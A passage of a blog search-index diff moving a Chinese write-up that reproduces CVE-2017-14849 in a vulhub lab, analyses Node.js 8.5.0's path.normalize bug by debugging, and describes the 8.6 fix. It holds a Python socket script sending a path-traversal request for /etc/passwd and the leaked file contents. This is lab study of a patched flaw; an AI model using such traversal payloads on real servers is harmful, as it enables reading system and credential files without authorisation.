class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930203042577.png" alt="结果"></p>
+<p>成功泄露了<code>/etc/passwd</code>文件中的数据。</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>express.static()</code> 是 Express.js 框架提供的一个中间件函数，用于提供静态文件（例如图片、CSS 文件和JavaScript 文件）。它基于 <code>serve-static</code> 模块。使用 <code>express.static()</code> 函数，你可以方便地为你的 Express 应用程序提供静态资源。你只需指定一个目录作为资源的根目录，然后 Express 会自动为其中的文件提供服务。这个函数的参数引入了<code>path.join()</code>:</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001185044414.png" alt="static()"></p>
+<p><code>path.join</code>中使用了<code>normalize</code>函数：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001184755578.png" alt="path"></p>
+<p>我们先用<code>docker exec -it &#123;id&#125; bash</code>进入容器终端进行交互，可以发现<code>normalize</code>函数确实存在漏洞:</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930203813787.png" alt="node"></p>
+<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>本来想用node.js远程调试的，但是没办法给path模块里面的函数打断点，跳转也老是跳到一些不认识的函数里面。没办法，只能下载<a href="https://github.com/nodejs/node/tree/v8.5.0">Node.js 8.5版本</a>的源码，放到Windows里面，发现也存在这个漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;./path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> normalizedPath = path.<span class="title function_">normalize</span>(<span class="string">&quot;../../../foo/../../../../etc/passwd&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(normalizedPath);</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc\passwd</span><br></pre></td></tr></table></figure>
+
+<p>那就可以在Windows环境下进行调试了，好好好。</p>
+<p>打断点开始调试，最后定位到436行的<code>normalizeStringWin32</code>函数：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001194410824.png" alt="436"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001194926279.png" alt="tail"></p>
+<p>可以发现运行完成以后，<code>tail</code>变量变成了<code>etc\\passwd</code>。</p>
+<p>函数开头定义了一些变量以后，39行对<code>path</code>中的字符进行遍历：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001201706430.png"></p>
+<p>观察每次for循环<code>res</code>的变化：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202041418.png"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202144091.png"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202234963.png"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202435962.png"></p>
+<p>返回值在遍历到<code>foo/../</code>以后，就逐渐偏离正轨了。后面每遍历一个<code>../</code>，结果就会少一个<code>../</code>。</p>
+<p>为了方便调试，我们尝试把输入改成<code>../a/../../b</code>:</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004191147410.png" alt="docker中的结果"></p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004191440736.png" alt="无漏洞版本的运行结果"></p>
+<p>应该也能触发漏洞。</p>
+<p>之后继续下断点，调试。</p>
+<p>主要内容还是在那个for循环中，直接跳到<code>res</code>为<code>..\\a</code>时，此时<code>i</code>为<code>5</code>。</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004194244978.png"></p>
+<p><code>i=5</code>时对应的字符是<code>.</code>，<code>code = path.charCodeAt(i)</code>，故<code>code</code>为46，<code>dots</code>变为1：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004194909551.png"></p>
+<p><code>i=6</code>时情况相同，<code>dots</code>变为2。</p>
+<p><code>i=7</code>时，<code>code</code>为47，由于还没有到根目录，所以进入了50行的if语句中：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004195816759.png"></p>
+<p>此时函数检测到了<code>../</code>，于是找到 <code>res</code> 中的最后一个反斜杠（<code>\</code>）并将其后的部分切除，从而移除路径中的最后一个部分：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004210210983.png"></p>
+<p>结果是<code>..\a</code>变成了<code>..</code>。</p>
+<p>遍历下一个<code>../</code>时，即<code>i=10</code>，此时<code>isAboveRoot</code>仍为假（实际应为真，因为<code>res</code>为<code>..</code>），导致进入了第70行的分支，res直接变成了<code>&#39;&#39;</code>。</p>
+<p>所以最终结果为<code>a</code>。</p>
+<p>当输入为<code>../../../b</code>时，由于<code>isAboveRoot</code>一直为真，所以无法进入50行中的if分支中。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在<a href="https://github.com/nodejs/node/blob/v8.6.0/lib/path.js">Node.js 8.6中</a>，对第50行的if判断进行了修改：</p>
+<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004213112204.png" alt="8.6"></p>
+<p>新函数中引入了一个新的变量 <code>lastSegmentLength</code>，它的目的是跟踪最后一部分的长度，即 <code>res</code> 中的最后一个斜杠（<code>\</code>）之后的字符数。<code>i=10</code>时，<code>res</code>为<code>..</code>，<code>lastSegmentLength</code>为2,if条件不成立。</p>
 ]]></content>
       <categories>
-        <category>bug记录</category>
+        <category>网络空间安全</category>
       </categories>
       <tags>
-        <tag>bug记录</tag>
-        <tag>python</tag>
+        <tag>node.js</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -972,90 +1097,6 @@
       <tags>
         <tag>学习笔记</tag>
         <tag>正则表达式</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulhub:node-CVE-2017-14849漏洞复现和浅析</title>
-    <url>/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/</url>
-    <content><![CDATA[<p><code>CVE-2017-14849</code>是Node.js 8.5.0 版本中路径检查时出现的安全漏洞。参考github中vulhub项目的readme：</p>
-<blockquote>
-<p>原因是 Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致向上层跳跃的时候（如<code>../../../../../../etc/passwd</code>），在中间位置增加<code>foo/../</code>（如<code>../../../foo/../../../../etc/passwd</code>），即可使<code>normalize</code>返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>../../../../../../etc/passwd</code>。</p>
-<p>express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于<code>normalize</code>函数。比如，express在判断path是否超出静态目录范围时，就用到了<code>normalize</code>函数，上述BUG导致<code>normalize</code>函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p>
-</blockquote>
-<p>这篇写烂了，水平不足。</p>
-<span id="more"></span>
-
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>跳转到<code>vulhub-master/node/CVE-2017-14849</code>目录，执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>127.0.0.1:3000</code>，正常运行，且存在静态文件服务器：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930201821803.png" alt="运行界面"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930201932340.png" alt="静态文件"></p>
-<p>由于浏览器和python的requests库似乎都会对url进行规范化，导致<code>../</code>被处理(有点坑)，所以这里采用python的<code>socket</code>库和<code>burp suite</code>复现：</p>
-<p>首先尝试<code>static/../../../../../../../etc/passwd</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HOST = <span class="string">&quot;&quot;</span></span><br><span class="line">PORT = <span class="number">3000</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">request = (</span><br><span class="line">    <span class="string">&quot;GET /static/../../../../../../../etc/passwd HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Host: ip:3000\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Accept: */*\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Accept-Language: en\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    s.sendall(request.encode())</span><br><span class="line">    data = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br></pre></td></tr></table></figure>
-
-<p>返回结果:</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Content-Type: text/html; charset=utf-8     </span><br><span class="line">Content-Length: 177</span><br><span class="line">Date: Sat, 30 Sep 2023 12:22:41 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>Cannot GET /static/../../../../../../../etc/passwd<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>改为<code>/static/../../../a/../../../../etc/passwd</code>以后，返回结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Cache-Control: public, max-age=0</span><br><span class="line">Last-Modified: Wed, 13 Sep 2017 20:05:31 GMT</span><br><span class="line">ETag: W/&quot;4d4-15e7cd8b6f8&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 1236</span><br><span class="line">Date: Sat, 30 Sep 2023 12:29:01 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930203042577.png" alt="结果"></p>
-<p>成功泄露了<code>/etc/passwd</code>文件中的数据。</p>
-<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>express.static()</code> 是 Express.js 框架提供的一个中间件函数，用于提供静态文件（例如图片、CSS 文件和JavaScript 文件）。它基于 <code>serve-static</code> 模块。使用 <code>express.static()</code> 函数，你可以方便地为你的 Express 应用程序提供静态资源。你只需指定一个目录作为资源的根目录，然后 Express 会自动为其中的文件提供服务。这个函数的参数引入了<code>path.join()</code>:</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001185044414.png" alt="static()"></p>
-<p><code>path.join</code>中使用了<code>normalize</code>函数：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001184755578.png" alt="path"></p>
-<p>我们先用<code>docker exec -it &#123;id&#125; bash</code>进入容器终端进行交互，可以发现<code>normalize</code>函数确实存在漏洞:</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20230930203813787.png" alt="node"></p>
-<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>本来想用node.js远程调试的，但是没办法给path模块里面的函数打断点，跳转也老是跳到一些不认识的函数里面。没办法，只能下载<a href="https://github.com/nodejs/node/tree/v8.5.0">Node.js 8.5版本</a>的源码，放到Windows里面，发现也存在这个漏洞。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;./path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> normalizedPath = path.<span class="title function_">normalize</span>(<span class="string">&quot;../../../foo/../../../../etc/passwd&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(normalizedPath);</span><br></pre></td></tr></table></figure>
-
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc\passwd</span><br></pre></td></tr></table></figure>
-
-<p>那就可以在Windows环境下进行调试了，好好好。</p>
-<p>打断点开始调试，最后定位到436行的<code>normalizeStringWin32</code>函数：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001194410824.png" alt="436"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001194926279.png" alt="tail"></p>
-<p>可以发现运行完成以后，<code>tail</code>变量变成了<code>etc\\passwd</code>。</p>
-<p>函数开头定义了一些变量以后，39行对<code>path</code>中的字符进行遍历：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001201706430.png"></p>
-<p>观察每次for循环<code>res</code>的变化：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202041418.png"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202144091.png"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202234963.png"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231001202435962.png"></p>
-<p>返回值在遍历到<code>foo/../</code>以后，就逐渐偏离正轨了。后面每遍历一个<code>../</code>，结果就会少一个<code>../</code>。</p>
-<p>为了方便调试，我们尝试把输入改成<code>../a/../../b</code>:</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004191147410.png" alt="docker中的结果"></p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004191440736.png" alt="无漏洞版本的运行结果"></p>
-<p>应该也能触发漏洞。</p>
-<p>之后继续下断点，调试。</p>
-<p>主要内容还是在那个for循环中，直接跳到<code>res</code>为<code>..\\a</code>时，此时<code>i</code>为<code>5</code>。</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004194244978.png"></p>
-<p><code>i=5</code>时对应的字符是<code>.</code>，<code>code = path.charCodeAt(i)</code>，故<code>code</code>为46，<code>dots</code>变为1：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004194909551.png"></p>
-<p><code>i=6</code>时情况相同，<code>dots</code>变为2。</p>
-<p><code>i=7</code>时，<code>code</code>为47，由于还没有到根目录，所以进入了50行的if语句中：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004195816759.png"></p>
-<p>此时函数检测到了<code>../</code>，于是找到 <code>res</code> 中的最后一个反斜杠（<code>\</code>）并将其后的部分切除，从而移除路径中的最后一个部分：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004210210983.png"></p>
-<p>结果是<code>..\a</code>变成了<code>..</code>。</p>
-<p>遍历下一个<code>../</code>时，即<code>i=10</code>，此时<code>isAboveRoot</code>仍为假（实际应为真，因为<code>res</code>为<code>..</code>），导致进入了第70行的分支，res直接变成了<code>&#39;&#39;</code>。</p>
-<p>所以最终结果为<code>a</code>。</p>
-<p>当输入为<code>../../../b</code>时，由于<code>isAboveRoot</code>一直为真，所以无法进入50行中的if分支中。</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在<a href="https://github.com/nodejs/node/blob/v8.6.0/lib/path.js">Node.js 8.6中</a>，对第50行的if判断进行了修改：</p>
-<p><img src="/2023/10/vulhub-node-cve-2017-14849-lou-dong-fu-xian-he-qian-xi/image-20231004213112204.png" alt="8.6"></p>
-<p>新函数中引入了一个新的变量 <code>lastSegmentLength</code>，它的目的是跟踪最后一部分的长度，即 <code>res</code> 中的最后一个斜杠（<code>\</code>）之后的字符数。<code>i=10</code>时，<code>res</code>为<code>..</code>，<code>lastSegmentLength</code>为2,if条件不成立。</p>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>node.js</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
